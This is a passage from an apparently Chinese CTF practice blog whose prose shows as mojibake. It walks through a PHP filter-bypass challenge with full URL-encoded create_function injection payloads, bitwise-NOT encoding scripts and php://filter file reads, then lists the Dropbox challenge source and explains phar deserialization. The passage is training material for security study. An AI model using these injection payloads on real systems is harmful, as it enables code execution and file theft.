    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);


if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;
    extract($_GET[&quot;flag&quot;]);
    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;
&#125; else&#123;
    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);
&#125;

if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || 
preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; 
    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); 
&#125; else &#123; 
    include &quot;flag.php&quot;;
    $code(&#39;&#39;, $arg); 
&#125; ?&gt;</code></pre>

<p>è¿‡æ»¤äº†ä¸€å †ä¸œè¥¿</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209223849475.png" alt="image-20211209223849475"></p>
<p>é¦–å…ˆæ˜¯è¿™ä¸ªï¼Œquery_stringè·å–çš„å†…å®¹ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥ç»•è¿‡è¿™ä¸€æ­¥å°±åªéœ€è¦æŠŠä¼ å…¥çš„å‚æ•°è¿›è¡Œurlç¼–ç å°±è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224105760.png" alt="image-20211209224105760"></p>
<p>è¿™é‡Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡preg_matchçš„åŒ¹é…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224139505.png" alt="image-20211209224139505"></p>
<p>è¿™ä¸ªç”±äºæ£€æµ‹çš„$_REQUESTï¼Œè€Œå¯¹ $_REQUESTæ¥è¯´postçš„ä¼˜å…ˆçº§å¤§äºgetï¼Œæ‰€ä»¥è¦postä¼ å…¥å’Œgetå†…å®¹ç›¸åŒçš„å‚æ•°ï¼ŒæŠŠå€¼æ”¹ä¸ºæ•°å­—å°±è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224337739.png" alt="image-20211209224337739"></p>
<p>è¿™ä¸ªè¦ç”¨data://ä¼ªåè®®å°±è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224412665.png" alt="image-20211209224412665"></p>
<p>å¸¸è§çš„æ•°ç»„ç»•è¿‡</p>
<p>æœ€åè¿™ä¹Ÿæ˜¯æœ€é‡è¦çš„åœ°æ–¹</p>
<p>é¦–å…ˆè¯´ä¸€ä¸‹<strong>create_functionæ³¨å…¥</strong></p>
<p><code>create_function()</code> å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° <code>$args</code> å’Œ <code>$code</code>ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ª lambda æ ·å¼çš„å‡½æ•°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225145733.png" alt="image-20211209225145733"></p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹bè¿›è¡Œæ“ä½œï¼Œæ¥å®ç°è¿™ä¸ªå‡½æ•°çš„æå‰é—­åˆï¼Œå¹¶å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ï¼Œç„¶åé€šè¿‡æ³¨é‡Šç¬¦ä½¿è¯­å¥åˆç†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225534763.png" alt="image-20211209225534763"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224450239.png" alt="image-20211209224450239"></p>
<p><code>$arg</code> å’Œ <code>$code</code> å˜é‡éƒ½æ˜¯å¯æ§çš„ï¼Œå› ä¸º <code>extract()</code> å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚å› æ­¤åªè¦ <code>extract()</code> å†…çš„æ•°ç»„é”®åä¸º <code>arg</code> å’Œ <code>code</code>ï¼Œé”®å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„ç”¨æ¥æ³¨å…¥çš„ä»£ç ï¼Œå³å¯å®ç° <code>$arg</code> å’Œ <code>$code</code> çš„å˜é‡è¦†ç›–ï¼Œå¯¼è‡´ä»£ç æ³¨å…¥ã€‚</p>
<p>å†åˆ©ç”¨</p>
<pre class="language-none"><code class="language-none">var_dump(get_defined_vars())</code></pre>

<p>ç”¨æ¥è¾“å‡ºæ‰€æœ‰å˜é‡å’Œå€¼</p>
<pre class="language-none"><code class="language-none">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e

è§£ç å†…å®¹ï¼š
&#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute
&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209214827071.png" alt="image-20211209214827071"></p>
<p>ä½†æ˜¯çœ‹è§flagåœ¨rea1fl4gé‡Œ</p>
<p>æ‰€ä»¥è¦åˆ©ç”¨requireåŒ…å«è¿™ä¸ªæ–‡ä»¶ç„¶åå†ç”¨get_defined_vars()è¯»ä¸€éè¯•è¯•</p>
<p>ä½†æ˜¯åˆè¿‡æ»¤äº†.</p>
<p>æ‰€ä»¥è¯•è¯•base64ç¼–ç </p>
<pre class="language-none"><code class="language-none">GET:
&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e
POST:
file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209215908383.png" alt="image-20211209215908383"></p>
<p>è¿˜æ˜¯ä¸è¡Œï¼Œå°è¯•ä¼ªåè®®è¯»æºç äº†åªèƒ½</p>
<p>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</p>
<p>é‡‡ç”¨å–åç»•è¿‡è¿‡æ»¤</p>
<pre class="language-none"><code class="language-none">GET:
&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e
&#x2F;&#x2F;è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæŠŠrequireä¹Ÿå–åå°±æ²¡æ³•ç”¨äº†

POST:
file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1
&#x2F;&#x2F; preg_match() åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209232958132.png" alt="image-20211209232958132"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209221809797.png" alt="image-20211209221809797"></p>
<p><a target="_blank" rel="noopener" href="https://blog.gem-love.com/ctf/770.html">2020BJDCTF â€œEzPHPâ€ +Y1ngCTF â€œY1ngâ€™s Baby Codeâ€ å®˜æ–¹writeup â€“ é¢–å¥‡L&#39;Amore (gem-love.com)</a></p>
<p>åŸé¢˜ç”¨å¼‚æˆ–ä¹Ÿå¯ä»¥ï¼Œè´´ä¸ªè„šæœ¬å…ˆï¼Œä¸‡ä¸€ä»¥åèƒ½ç”¨åˆ°</p>
<pre class="language-none"><code class="language-none">#Author: piCEBDC7
str_&#x3D; &#39;1flag.php&#39;
str_&#x3D;list(str_)
final&#x3D;&#39;&#39;
for x in str_:
    print(hex(~ord(x)&amp;0xff))
    final+&#x3D;hex(~ord(x)&amp;0xff)
print(str_)
final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;)
final+&#x3D;&#39;^&#39;
for x in range(len(str_)):
    final+&#x3D;r&#39;%ff&#39;
print(final)</code></pre>

<p>å–åè„šæœ¬</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?
&#x2F;&#x2F;Author: é¢–å¥‡L&#39;Amore
&#x2F;&#x2F;Blog: www.gem-love.com
$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;
$arr1 &#x3D; explode(&#39; &#39;, $a);
echo &quot;&lt;br&gt;~(&quot;;
foreach ($arr1 as $key &#x3D;&gt; $value) &#123;
	echo &quot;%&quot;.bin2hex(~$value);
&#125;
echo &quot;)&lt;br&gt;&quot;;</code></pre>

<p>ç”¨ç¾½å¸ˆå‚…é‚£ä¸ªä¹Ÿè¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209235444083.png" alt="image-20211209235444083"></p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>çŸ¥è¯†ç‚¹ï¼špharçš„ååºåˆ—åŒ–</p>
<p>ä¼ ä¸ªjpgæ–‡ä»¶ç„¶åä¸‹è½½çš„æ—¶å€™æŠ“åŒ…æœ‰ä¸ªfilenameï¼Œè¿™é‡Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213306758.png" alt="image-20211210213306758"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213358180.png" alt="image-20211210213358180"></p>
<p>index.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) &#123;
    header(&quot;Location: login.php&quot;);
    die();
&#125;
?&gt;


&lt;?php
include &quot;class.php&quot;;

$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);
$a-&gt;Name();
$a-&gt;Size();
?&gt;</code></pre>

<p>download.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) &#123;
    header(&quot;Location: login.php&quot;);
    die();
&#125;

if (!isset($_POST[&#39;filename&#39;])) &#123;
    die();
&#125;

include &quot;class.php&quot;;
ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);

chdir($_SESSION[&#39;sandbox&#39;]);
$file &#x3D; new File();
$filename &#x3D; (string) $_POST[&#39;filename&#39;];
if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;
    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);
    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));
    echo $file-&gt;close();
&#125; else &#123;
    echo &quot;File not exist&quot;;
&#125;
?&gt;
</code></pre>

<p>login.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
session_start();
if (isset($_SESSION[&#39;login&#39;])) &#123;
    header(&quot;Location: index.php&quot;);
    die();
&#125;
?&gt;

&lt;?php
include &quot;class.php&quot;;

if (isset($_GET[&#39;register&#39;])) &#123;
    echo &quot;&lt;script&gt;toast(&#39;æ³¨å†ŒæˆåŠŸ&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;
&#125;

if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;
    $u &#x3D; new User();
    $username &#x3D; (string) $_POST[&quot;username&quot;];
    $password &#x3D; (string) $_POST[&quot;password&quot;];
    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;
        $_SESSION[&#39;login&#39;] &#x3D; true;
        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);
        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;
        if (!is_dir($sandbox)) &#123;
            mkdir($sandbox);
        &#125;
        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;
        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);
        die();
    &#125;
    echo &quot;&lt;script&gt;toast(&#39;è´¦å·æˆ–å¯†ç é”™è¯¯&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;
&#125;
?&gt;</code></pre>

<p>class.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);
$dbaddr &#x3D; &quot;127.0.0.1&quot;;
$dbuser &#x3D; &quot;root&quot;;
$dbpass &#x3D; &quot;root&quot;;
$dbname &#x3D; &quot;dropbox&quot;;
$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User &#123;
    public $db;

    public function __construct() &#123;
        global $db;
        $this-&gt;db &#x3D; $db;
    &#125;

    public function user_exist($username) &#123;
        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);
        $stmt-&gt;bind_param(&quot;s&quot;, $username);
        $stmt-&gt;execute();
        $stmt-&gt;store_result();
        $count &#x3D; $stmt-&gt;num_rows;
        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;
            return false;
        &#125;
        return true;
    &#125;

    public function add_user($username, $password) &#123;
        if ($this-&gt;user_exist($username)) &#123;
            return false;
        &#125;
        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);
        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);
        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
        $stmt-&gt;execute();
        return true;
    &#125;

    public function verify_user($username, $password) &#123;
        if (!$this-&gt;user_exist($username)) &#123;
            return false;
        &#125;
        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);
        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);
        $stmt-&gt;bind_param(&quot;s&quot;, $username);
        $stmt-&gt;execute();
        $stmt-&gt;bind_result($expect);
        $stmt-&gt;fetch();
        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;
            return true;
        &#125;
        return false;
    &#125;

    public function __destruct() &#123;
        $this-&gt;db-&gt;close();
    &#125;
&#125;

class FileList &#123;
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) &#123;
        $this-&gt;files &#x3D; array();
        $this-&gt;results &#x3D; array();
        $this-&gt;funcs &#x3D; array();
        $filenames &#x3D; scandir($path);

        $key &#x3D; array_search(&quot;.&quot;, $filenames);
        unset($filenames[$key]);
        $key &#x3D; array_search(&quot;..&quot;, $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) &#123;
            $file &#x3D; new File();
            $file-&gt;open($path . $filename);
            array_push($this-&gt;files, $file);
            $this-&gt;results[$file-&gt;name()] &#x3D; array();
        &#125;
    &#125;

    public function __call($func, $args) &#123;
        array_push($this-&gt;funcs, $func);
        foreach ($this-&gt;files as $file) &#123;
            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();
        &#125;
    &#125;

    public function __destruct() &#123;
        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;
        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;
        foreach ($this-&gt;funcs as $func) &#123;
            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;
        &#125;
        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;
        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;
        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;
            $table .&#x3D; &#39;&lt;tr&gt;&#39;;
            foreach ($result as $func &#x3D;&gt; $value) &#123;
                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;
            &#125;
            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;ä¸‹è½½&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;åˆ é™¤&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;
            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;
        &#125;
        echo $table;
    &#125;
&#125;

class File &#123;
    public $filename;

    public function open($filename) &#123;
        $this-&gt;filename &#x3D; $filename;
        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;
            return true;
        &#125; else &#123;
            return false;
        &#125;
    &#125;

    public function name() &#123;
        return basename($this-&gt;filename);
    &#125;

    public function size() &#123;
        $size &#x3D; filesize($this-&gt;filename);
        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);
        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;
        return round($size, 2).$units[$i];
    &#125;

    public function detele() &#123;
        unlink($this-&gt;filename);
    &#125;

    public function close() &#123;
        return file_get_contents($this-&gt;filename);
    &#125;
&#125;
?&gt;
</code></pre>

<p>delete.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) &#123;
    header(&quot;Location: login.php&quot;);
    die();
&#125;

if (!isset($_POST[&#39;filename&#39;])) &#123;
    die();
&#125;

include &quot;class.php&quot;;

chdir($_SESSION[&#39;sandbox&#39;]);
$file &#x3D; new File();
$filename &#x3D; (string) $_POST[&#39;filename&#39;];
if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;
    $file-&gt;detele();
    Header(&quot;Content-type: application&#x2F;json&quot;);
    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);
    echo json_encode($response);
&#125; else &#123;
    Header(&quot;Content-type: application&#x2F;json&quot;);
    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);
    echo json_encode($response);
&#125;
?&gt;
</code></pre>

<p>pharååºåˆ—åŒ–åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>1ï¼‰pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨</p>
<p>2ï¼‰è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä¸ºè·³æ¿</p>
<p>3ï¼‰æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</p>
<p>å¯¹äºæœ¬é¢˜è€Œè¨€ï¼Œç¬¬ä¸€æ¡æ»¡è¶³ï¼Œç¬¬äºŒæ¡æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•__call()å’ŒFileListç±»ã€Userç±»çš„__destruct()ï¼Œææ€•æƒ³ä¸åˆ©ç”¨å®ƒä»¬ä¹Ÿä¸è¡Œï¼Œç¬¬ä¸‰æ¡ååŠéƒ¨åˆ†æ²¡é—®é¢˜ï¼Œå‰åŠéƒ¨åˆ†åˆ™éœ€è¦æˆ‘ä»¬æ‰¾ä¸€æ‰¾ã€‚</p>
<p>æ—¢æ›°æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå°±åº”è¯¥åœ¨æœ¬é¢˜çš„Fileç±»ï¼ˆè‡³å¤šä¹Ÿåœ¨FileListç±»ï¼‰çš„æ–¹æ³•ä¸­å¯»æ‰¾ï¼Œæ¯•ç«Ÿæ•´ä¸ªé¢˜ç›®åŸºæœ¬ä¸Šéƒ½æ˜¯åœ¨é¢å‘å¯¹è±¡çš„åŸºç¡€ä¸Šç¼–ç¨‹ï¼Œå¯¹æ–‡ä»¶çš„æ“ä½œä¹Ÿéƒ½æ˜¯å¯¹Fileç±»çš„å¯¹è±¡çš„æ“ä½œï¼Œ</p>
<p>æˆ‘ä»¬çœ‹åˆ°ï¼Œopen()æ–¹æ³•è°ƒç”¨äº†file_exists()å’Œis_dir()å‡½æ•°ï¼ˆæ³¨æ„nameæ–¹æ³•é‡Œçš„basenameå‡½æ•°ä¸ç®—ï¼‰ï¼Œsize()æ–¹æ³•è°ƒç”¨äº†filesize()å‡½æ•°ï¼Œdelete()æ–¹æ³•è°ƒç”¨äº†unlink()å‡½æ•°ï¼Œclose()æ–¹æ³•file_get_contents()å‡½æ•°ã€‚</p>
<p>æˆ‘ä»¬å‰é¢æåˆ°äº†ï¼Œæœ¬é¢˜è¦è¯»å–/flag.txtæ–‡ä»¶ï¼Œæ•…åˆšåˆšåˆ—ä¸¾çš„è¿™äº›å‡½æ•°ä¸­ï¼Œè™½ç„¶æ–‡ä»¶æ“ä½œå‡½æ•°ä¸å°‘ï¼Œå¯ä»¥ç”¨æ¥è§¦å‘ååºåˆ—åŒ–ï¼Œå¯¹è¯»å–æ–‡ä»¶æœ‰ç”¨çš„åªæœ‰close()æ–¹æ³•ä¸­çš„file_get_contents()å‡½æ•°è¿™ä¸€ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹å®ƒåˆ†æï¼Œ</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœæƒ³ä¸åˆ°__call()æ–¹æ³•å’Œ__destruct()æ–¹æ³•ï¼ŒåŸºæœ¬ä¸Šå°±å¯ä»¥æ”¾å¼ƒäº†ï¼Œåœ¨pharé¢˜ç›®é‡Œï¼Œé­”æœ¯æ–¹æ³•ä¸€èˆ¬æ¥è®²æ˜¯å¿…é¡»è¦ç”¨çš„ï¼Œ</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851076-8640cc264961f33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/799/format/webp" alt="img"></p>
<p>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ï¼ŒFileListçš„__call()æ–¹æ³•è¯­ä¹‰ç®€å•ï¼Œå°±æ˜¯éå†filesæ•°ç»„ï¼Œå¯¹æ¯ä¸€ä¸ªfileå˜é‡æ‰§è¡Œä¸€æ¬¡$funcï¼Œç„¶åå°†ç»“æœå­˜è¿›$resultsæ•°ç»„ï¼Œ</p>
<p>æ¥ä¸‹æ¥çš„__destructå‡½æ•°ä¼šå°†FileListå¯¹è±¡çš„funcså˜é‡å’Œresultsæ•°ç»„ä¸­çš„å†…å®¹ä»¥HTMLè¡¨æ ¼çš„å½¢å¼è¾“å‡ºåœ¨index.phpä¸Šï¼ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œindex.phpé‡Œåˆ›å»ºäº†ä¸€ä¸ªFileListå¯¹è±¡ï¼Œåœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•åè§¦å‘__destructï¼Œåˆ™ä¼šè¾“å‡ºè¯¥ç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯ï¼‰ï¼Œ</p>
<p>Userå¯¹è±¡çš„__destruct()æ–¹æ³•ï¼Œ</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851076-09b15043434b727a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/479/format/webp" alt="img"></p>
